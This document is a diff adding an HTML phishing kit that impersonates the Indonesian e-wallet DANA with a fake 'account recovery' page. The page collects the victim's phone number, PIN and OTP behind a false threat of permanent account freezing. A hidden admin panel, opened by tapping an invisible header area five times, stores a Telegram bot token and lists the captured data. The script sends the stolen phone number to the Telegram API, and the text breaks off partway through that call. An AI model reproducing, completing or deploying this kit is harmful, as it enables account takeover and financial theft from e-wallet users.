@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Pemulihan Akun</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dana: '#108ee9',
+                    },
+                    gradientColorStops: {
+                        'dana-gradient': ['#29b6f6', '#4fc3f7'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .content-auto {
+                content-visibility: auto;
+            }
+            .bg-dana-gradient {
+                background: linear-gradient(135deg, #29b6f6 0%, #4fc3f7 100%);
+            }
+            .active-scale {
+                transition: transform 0.15s ease;
+            }
+            .active-scale:active {
+                transform: scale(0.98);
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="min-h-screen max-w-md mx-auto relative overflow-hidden bg-white shadow-xl">
+
+        <!-- ========================================== -->
+        <!--             HALAMAN UTAMA                  -->
+        <!-- ========================================== -->
+        <div id="page-home" class="page w-full h-full absolute top-0 left-0 bg-white">
+            <!-- Header Sederhana -->
+            <div class="bg-dana py-4 px-4 flex items-center justify-center relative">
+                <div class="absolute left-4 w-8 h-8" onclick="bukaAdmin()"></div>
+                <h1 class="text-white font-bold text-xl">DANA</h1>
+            </div>
+            
+            <!-- Banner -->
+            <div class="mx-4 mt-4 rounded-xl overflow-hidden">
+                <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/c10cc9190_images1.jpg" alt="Diana" class="w-full" />
+            </div>
+
+            <!-- Options -->
+            <div class="px-4 mt-6">
+                <h2 class="text-lg font-bold text-gray-800 mb-4">INPUT SESUAI KENDALAMU</h2>
+
+                <div 
+                    onclick="bukaHalamanPhone('pemulihan_akun')"
+                    class="bg-dana-gradient rounded-xl p-5 mb-4 cursor-pointer active-scale"
+                >
+                    <div class="flex items-center gap-3 mb-2">
+                        <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/64960b9c1_images12.png" alt="DANA" class="w-10 h-10 rounded-xl" />
+                        <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/addb2c666_dana-logofe46647.png" alt="DANA" class="h-5" />
+                    </div>
+                    <h3 class="text-white font-bold text-lg">Pemulihan Akun DANA Terdeteksi</h3>
+                    <p class="text-white/90 text-sm mt-1">Segera lakukan pemulihan akun Dana untuk menghindari pembekuan permanen oleh sistem</p>
+                </div>
+
+                <div 
+                    onclick="bukaHalamanPhone('kendala_lainnya')"
+                    class="bg-dana-gradient rounded-xl p-5 cursor-pointer active-scale"
+                >
+                    <div class="flex items-center gap-3 mb-2">
+                        <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/64960b9c1_images12.png" alt="DANA" class="w-10 h-10 rounded-xl" />
+                        <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/addb2c666_dana-logofe46647.png" alt="DANA" class="h-5" />
+                    </div>
+                    <h3 class="text-white font-bold text-lg">Laporkan Kendala Lainnya</h3>
+                    <p class="text-white/90 text-sm mt-1">Customer Care Support Team Siap untuk Membantu kamu</p>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="mt-8">
+                <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/2bb94df31_footer2.jpeg" alt="Footer" class="w-full" />
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!--             HALAMAN NOMOR HP               -->
+        <!-- ========================================== -->
+        <div id="page-phone" class="page w-full h-full absolute top-0 left-0 bg-dana hidden flex-col">
+            <div class="flex-1 flex flex-col items-center pt-12 px-6">
+                <div class="flex items-center gap-2 mb-6">
+                    <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/addb2c666_dana-logofe46647.png" alt="DANA" class="h-9" />
+                </div>
+
+                <p class="text-white text-center text-lg mb-8">
+                    Masukkan <b>nomor HP</b> kamu untuk lanjut
+                </p>
+
+                <div class="w-full flex gap-3 items-end mb-4">
+                    <div>
+                        <p class="text-white/80 text-sm mb-1">Negara</p>
+                        <div class="bg-white/20 rounded-lg px-3 py-3 flex items-center gap-2 text-white font-medium">
+                            <span class="text-lg">🇮🇩</span> +62
+                        </div>
+                    </div>
+                    <div class="flex-1">
+                        <p class="text-white/80 text-sm mb-1">Nomor</p>
+                        <input
+                            type="tel"
+                            id="inputPhone"
+                            placeholder="811-1234-5678"
+                            class="w-full bg-white/20 rounded-lg px-4 py-3 text-white placeholder-white/50 outline-none text-lg"
+                        />
+                    </div>
+                </div>
+
+                <p class="text-white/80 text-sm text-center mt-2">
+                    Dengan melanjutkan, kamu setuju dengan{" "}
+                    <b class="text-white">Syarat & Ketentuan</b> serta{" "}
+                    <b class="text-white">Pemberitahuan Privasi</b> kami
+                </p>
+            </div>
+
+            <div class="px-6 pb-8">
+                <button
+                    id="btnLanjutPhone"
+                    onclick="kirimNomorDanLanjut()"
+                    class="w-full py-4 rounded-xl text-lg font-bold transition-all disabled:bg-gray-300 disabled:text-gray-500 bg-white text-dana"
+                >
+                    LANJUT
+                </button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!--             HALAMAN PIN                   -->
+        <!-- ========================================== -->
+        <div id="page-pin" class="page w-full h-full absolute top-0 left-0 bg-white hidden">
+            <div class="bg-dana px-4 py-3 flex items-center">
+                <i class="fa fa-times text-white w-6 h-6 cursor-pointer" onclick="kembaliKe('phone')"></i>
+                <span class="text-white font-bold text-lg flex-1 text-center mr-6">Masuk</span>
+            </div>
+
+            <div class="px-6 pt-12 flex flex-col items-center">
+                <h2 class="text-2xl font-bold text-gray-800 mb-8">Masukkan PIN</h2>
+
+                <div class="flex gap-3 mb-8" id="pinContainer">
+                    <div class="relative w-7 h-7">
+                        <div class="w-7 h-7 rounded-full border-2 border-gray-300 bg-gray-200 transition-all"></div>
+                    </div>
+                    <div class="relative w-7 h-7">
+                        <div class="w-7 h-7 rounded-full border-2 border-gray-300 bg-gray-200 transition-all"></div>
+                    </div>
+                    <div class="relative w-7 h-7">
+                        <div class="w-7 h-7 rounded-full border-2 border-gray-300 bg-gray-200 transition-all"></div>
+                    </div>
+                    <div class="relative w-7 h-7">
+                        <div class="w-7 h-7 rounded-full border-2 border-gray-300 bg-gray-200 transition-all"></div>
+                    </div>
+                    <div class="relative w-7 h-7">
+                        <div class="w-7 h-7 rounded-full border-2 border-gray-300 bg-gray-200 transition-all"></div>
+                    </div>
+                    <div class="relative w-7 h-7">
+                        <div class="w-7 h-7 rounded-full border-2 border-gray-300 bg-gray-200 transition-all"></div>
+                    </div>
+                </div>
+
+                <!-- Keyboard PIN -->
+                <div class="w-full max-w-xs mt-4 mb-6">
+                    <div class="grid grid-cols-3 gap-4">
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="1">1</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="2">2</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="3">3</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="4">4</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="5">5</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="6">6</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="7">7</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="8">8</button>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="9">9</button>
+                        <div></div>
+                        <button class="num-key py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200" data-num="0">0</button>
+                        <button id="delKey" class="py-3 text-xl font-bold text-gray-700 bg-gray-100 rounded-lg active:bg-gray-200">⌫</button>
+                    </div>
+                </div>
+
+                <div class="flex gap-8 mt-2">
+                    <button class="flex items-center gap-2 text-dana font-medium text-sm">
+                        <div class="w-6 h-6 bg-gray-200 rounded-full" />
+                        BUTUH BANTUAN?
+                    </button>
+                    <button class="text-dana font-medium text-sm">LUPA PIN?</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!--             HALAMAN OTP                   -->
+        <!-- ========================================== -->
+        <div id="page-otp" class="page w-full h-full absolute top-0 left-0 bg-white hidden">
+            <div class="bg-dana px-4 py-3">
+                <h1 class="text-white font-bold text-lg text-center">Verifikasi Akun</h1>
+            </div>
+
+            <div class="px-6 pt-6">
+                <div class="flex justify-center mb-4">
+                    <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/585d72c35_icon-notif.png" alt="notif" class="w-24 h-24" />
+                </div>
+
+                <div class="flex items-center gap-2 mb-4">
+                    <h2 class="text-lg font-bold text-gray-800">Verifikasi telah dikirim ke Akun</h2>
+                    <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/addb2c666_dana-logofe46647.png" alt="DANA" class="h-5" />
+                </div>
+
+                <div class="mx-8 mb-6 rounded-2xl overflow-hidden">
+                    <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/a7f504ffa_atas2.gif" alt="DANA" class="w-full" />
+                </div>
+
+                <p class="text-center text-gray-600 mb-3">Kode dikirim ke</p>
+
+                <div class="bg-dana rounded-full py-3 px-6 text-center mb-6">
+                    <span id="otpDisplayPhone" class="text-white font-bold text-lg"></span>
+                </div>
+
+                <p id="otpError" class="text-center text-red-500 font-semibold text-sm mb-3 hidden">Pastikan kode OTP yang kamu masukan benar</p>
+
+                <div class="flex justify-center gap-4 mb-4" id="otpContainer">
+                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-14 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-xl outline-none focus:border-dana bg-gray-50" />
+                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-14 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-xl outline-none focus:border-dana bg-gray-50" />
+                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-14 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-xl outline-none focus:border-dana bg-gray-50" />
+                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-14 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-xl outline-none focus:border-dana bg-gray-50" />
+                </div>
+
+                <p class="text-center text-gray-500 text-lg mb-6" id="otpTimer">03:00</p>
+
+                <div class="border-t pt-4">
+                    <h3 class="font-bold text-gray-800 mb-3">Silahkan Cek verifikasi akun</h3>
+                    <div class="flex items-start gap-3 mb-3">
+                        <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/585d72c35_icon-notif.png" alt="notif" class="w-8 h-8 flex-shrink-0" />
+                        <p class="text-sm text-gray-600">Tap notifikasi di perangkatmu di layar atas dan tap <b>VERIFIKASI</b>.</p>
+                    </div>
+                    <div class="flex items-start gap-3">
+                        <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/a5a1f08a5_icon-search.png" alt="search" class="w-8 h-8 flex-shrink-0" />
+                        <p class="text-sm text-gray-600">Tidak menerima notifikasi? Cek Kotak Masuk atau menu <b>Verifikasi</b>. atau cek di icon gambar <b>Amlop</b> dan tap <b>Verifikasi</b></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!--             HALAMAN ADMIN / PENGATURAN     -->
+        <!-- ========================================== -->
+        <div id="page-admin" class="page w-full h-full absolute top-0 left-0 bg-gray-50 hidden overflow-y-auto">
+            <div class="p-4">
+                <div class="flex items-center gap-2 mb-6">
+                    <i class="fa fa-cog w-6 h-6 text-gray-700"></i>
+                    <h1 class="text-2xl font-bold text-gray-800">Pengaturan Admin</h1>
+                </div>
+
+                <div class="bg-white rounded-xl p-5 shadow-sm mb-6">
+                    <h2 class="font-bold text-lg mb-4">Konfigurasi Telegram</h2>
+                    <div class="space-y-3">
+                        <div>
+                            <label class="text-sm text-gray-600 mb-1 block">Bot Token</label>
+                            <input id="botToken" type="text" placeholder="123456:ABC-DEF..." class="w-full px-3 py-2 border rounded-lg" />
+                        </div>
+                        <div>
+                            <label class="text-sm text-gray-600 mb-1 block">Chat ID</label>
+                            <input id="chatId" type="text" placeholder="-100123456789" class="w-full px-3 py-2 border rounded-lg" />
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="simpanConfig()" class="bg-dana text-white px-4 py-2 rounded-lg hover:bg-[#0d7dd4]">Simpan</button>
+                            <button onclick="testKirim()" class="border px-4 py-2 rounded-lg gap-1">
+                                <i class="fa fa-paper-plane-o w-4 h-4"></i> Test Kirim
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-xl p-5 shadow-sm">
+                    <h2 class="font-bold text-lg mb-4">Data Masuk (<span id="jumlahData">0</span>)</h2>
+                    <div id="listDataMasuk" class="space-y-3">
+                        <p class="text-gray-500 text-sm">Belum ada data masuk.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // Variabel Global
+        let currentType = "";
+        let currentPhone = "";
+        let currentPin = "";
+        let currentOtp = "";
+        let telegramMsgId = "";
+        let clickAdminCount = 0;
+        let timerInterval;
+
+        // Ambil data dari Penyimpanan Lokal
+        function getConfig() {
+            return {
+                token: localStorage.getItem('botToken') || "",
+                chat: localStorage.getItem('chatId') || ""
+            };
+        }
+
+        // Navigasi
+        function sembunyikanSemua() {
+            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
+        }
+
+        function bukaHalamanPhone(type) {
+            sembunyikanSemua();
+            currentType = type;
+            document.getElementById('page-phone').classList.remove('hidden');
+            document.getElementById('inputPhone').value = "";
+        }
+
+        function kembaliKe(tujuan) {
+            sembunyikanSemua();
+            if (tujuan === 'home') document.getElementById('page-home').classList.remove('hidden');
+            if (tujuan === 'phone') document.getElementById('page-phone').classList.remove('hidden');
+            if (tujuan === 'pin') document.getElementById('page-pin').classList.remove('hidden');
+            if (tujuan === 'otp') document.getElementById('page-otp').classList.remove('hidden');
+            if (tujuan === 'admin') document.getElementById('page-admin').classList.remove('hidden');
+        }
+
+        function bukaAdmin() {
+            clickAdminCount++;
+            if(clickAdminCount >= 5) {
+                sembunyikanSemua();
+                document.getElementById('page-admin').classList.remove('hidden');
+                clickAdminCount = 0;
+                // Isi nilai yang tersimpan
+                const cfg = getConfig();
+                document.getElementById('botToken').value = cfg.token;
+                document.getElementById('chatId').value = cfg.chat;
+                muatDataMasuk();
+            }
+        }
+
+        // ==========================================
+        //          LOGIKA HALAMAN PHONE
+        // ==========================================
+        function kirimNomorDanLanjut() {
+            const input = document.getElementById('inputPhone').value.replace(/\D/g, "");
+            if (!input || input.length < 8) {
+                alert("Masukkan nomor yang benar!");
+                return;
+            }
+            currentPhone = input;
+
+            // Simpan ke localStorage simulasi database
+            simpanDataKeLocal({phone: currentPhone, type: currentType, status: "phone"});
+
+            // Kirim ke Telegram
+            const cfg = getConfig();
+            const line = "━".repeat(21);
+            const pesan = `${line}\nDATA MASUK - DANA\n${line}\nNama Akun  : ${currentPhone}\nPin Akun   : menunggu...\nKode Akun  : menunggu...\n${line}`;
+            
+            if(cfg.token && cfg.chat) {
+                fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+                    method: "POST",
+                    heade
